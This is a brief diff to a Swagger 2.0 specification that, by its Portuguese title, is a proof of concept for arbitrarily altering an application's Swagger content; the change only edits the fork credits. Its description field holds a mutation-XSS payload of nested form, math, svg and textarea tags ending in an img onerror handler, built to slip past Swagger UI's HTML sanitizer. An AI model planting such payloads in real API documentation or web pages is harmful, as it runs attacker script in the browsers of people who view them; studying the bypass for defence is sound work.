@@ -1,6 +1,6 @@
 swagger: '2.0'
 info:
-  title: Essa É uma PoC que altera o conteúdo do Swagger da Aplicação de forma totalmente arbitrária. Fork Nildo teste
+  title: Essa É uma PoC que altera o conteúdo do Swagger da Aplicação de forma totalmente arbitrária. Fork saldanha, nildo teste
   description: |
     <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('AppVulneravelAXSS') src=1>"></form>
 
